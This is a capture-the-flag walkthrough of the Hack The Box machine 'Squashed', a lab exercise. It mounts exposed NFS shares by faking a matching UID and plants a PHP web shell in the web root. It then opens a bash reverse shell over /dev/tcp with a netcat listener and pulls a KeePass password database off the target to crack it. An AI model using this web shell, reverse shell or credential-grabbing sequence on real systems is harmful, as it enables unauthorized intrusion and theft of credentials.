# Squashed | HTB
### Difficulty Level: Easy
------------------------------------

Let's start with nmap scan:

```bash
nmap -p- -T4 -A 10.10.11.191 -oN squashed.nmap 
```

-p- scans all ports within the machine instead of the 1000 common.

-T4 - increases the speed of the scan.

-A - aggresive scan to gather mor information.

-oN - saves the output to a file.


Results:
```bash
Nmap scan report for 10.10.11.191
Host is up (0.12s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100005  1,2,3      38961/udp   mountd
|   100005  1,2,3      39445/tcp   mountd
|   100005  1,2,3      47585/tcp6  mountd
|   100005  1,2,3      58832/udp6  mountd
|   100021  1,3,4      34305/tcp   nlockmgr
|   100021  1,3,4      37751/tcp6  nlockmgr
|   100021  1,3,4      42038/udp6  nlockmgr
|   100021  1,3,4      44469/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
34305/tcp open  nlockmgr 1-4 (RPC #100021)
39445/tcp open  mountd   1-3 (RPC #100005)
41123/tcp open  mountd   1-3 (RPC #100005)
53489/tcp open  mountd   1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/22%OT=22%CT=1%CU=41001%PV=Y%DS=2%DC=T%G=Y%TM=65FD
OS:C504%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=102%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=FC%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GCD=1%ISR=102%TI=Z%CI=Z%
OS:TS=A)SEQ(SP=FD%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GCD=1%ISR=103
OS:%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O
OS:4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=
OS:FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=
OS:Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y
OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   164.52 ms 10.10.14.1
2   164.58 ms 10.10.11.191

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 470.91 seconds
```

There are 8 open ports:

22 - ssh

80 - http 

111 - rpcbind 

and... other open ports relate to rpc.

rpcbind is a program used in Unix and Linux operating systems. It acts as a directory service for remote procedure call (RPC) programs.

I have an access to webpage.


![image](https://cdn-images-1.medium.com/max/1000/1*VXF4lrKjyHJCpZBi89cxcQ.png)


First, I tried to understand the functionality of the webpage by inspecting it.

Let's use gobuster to find out if there are any directories:

```bash
└─# gobuster dir -u http://10.10.11.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.191
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.11.191/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.191/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.191/js/]
Progress: 46337 / 220561 (21.01%)
Progress: 46476 / 220561 (21.07%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 46494 / 220561 (21.08%)
===============================================================
Finished
```

Nothing there. On this system there is nfs service that run on it.
nfs Is a distributed file system protocol that allows a user on a client computer
to access files over a network as if they were stored locally.
NFS enables sharing files and directories among multiple computers in a network, typically within a Unix-like environment.

By using showmount we can watch the shared files within the server.

```bash
showmount -e 10.10.11.191
```

-e means export the files from the system.

```
/home/ross    *
/var/www/html *
```

There is username: ross.

the * sign means these directories are deafult shares if other directories weren't mentioned.

to use mount, I need to creat new user that has the same uid to make the mount successfully.

```bash
sudo mount -t nfs 10.10.11.191:/var/www/html <directory-to-mount-into-it>
```

```
So, create new user with uid of 2017:

```bash
sudo useradd -u 2017 toni
then set a pswword with:
sudo passwd toni
```

now, su toni and cd to the mounted directory, there upload a php code that will let use to run arbitrary commend within the system:

```bash
echo '<?php system($_GET['cmd']); ?>' > command.php
```

```
toni@kali:/home/kali/Desktop/CTF/HTB/squashed$ cat command.php
<?php system($_GET['cmd']); ?>
```

This code let us to run system command inside the variable 'cmd' in GET method.

Access the file throught the url and enter a command:


![image](https://cdn-images-1.medium.com/max/1000/1*yNKEgs0qrNZqFJhz0pd8wQ.png)


It works. Let's get a bash reverse shell and encode it for the url to inerpert it right:

```bash
bash -c 'bash -i >%26 /dev/tcp/<tun-0>/4444 0>%261'

and set netcat listener:

nc -lnvp 4444
```


and there is a shell as alex:
```bash
└─# nc -lnvp 4444            
listening on [any] 4444 ...
connect to [tun-0] from (UNKNOWN) [10.10.11.191] 46970
bash: cannot set terminal process group (1081): Inappropriate ioctl for device
bash: no job control in this shell
alex@squashed:/var/www/html$ ls
ls
command.php
css
images
index.html
js
alex@squashed:/var/www/html$
```

Grab the user.txt flag.

```bash
alex@squashed:/home/alex$ cat user.txt
cat user.txt
********************************
alex@squashed:/home/alex$
```

Let's go, get your root.

First, I uploaded linpeas.sh to the target machine with python http server.
It didn't find anything interesting.

I decided to read /etc/crontab but there is nothing.

Next, I uploaded pspy script to view processes that run within the system.

There is something interesting:
```bash
2024/03/23 00:52:41 CMD: UID=1001 PID=1653   | /usr/bin/keepassxc --pw-stdin --keyfile /usr/share/keepassxc/keyfiles/ross/keyfile.key /usr/share/keepassxc/databases/ross/Passwords.kdbx ```
```

There is keepass file that includes passwords, maybe there is something that will help us.

After a little movement between directories, the keepass file just been there in front of our eyes.

```
/home/ross/Documents/Passwords.kdbx
```

Open new python http server with other port on the target machine.
then pull the kdbx file to our machine.

```bash
on target machine:
python3 -m http.server 1111
on your machine:
wget http://10.10.11.191:1111/Passwords.kdbx
```

Let's open the file with keepassxc-cli:

```bash
──(root㉿kali)-[/home/kali/Desktop/CTF/HTB]
└─# keepassxc-cli ls Passwords.kdbx 
Enter password to unlock Passwords.kdbx: 
Error while reading the database: Invalid credentials were provided, please try again.
If this reoccurs, then your database file may be corrupt. (HMAC mismatch)
```

We need password to open the file. It's time to use keepass2john to convert the file into a hash that john the ripper
can deal with and work with.























































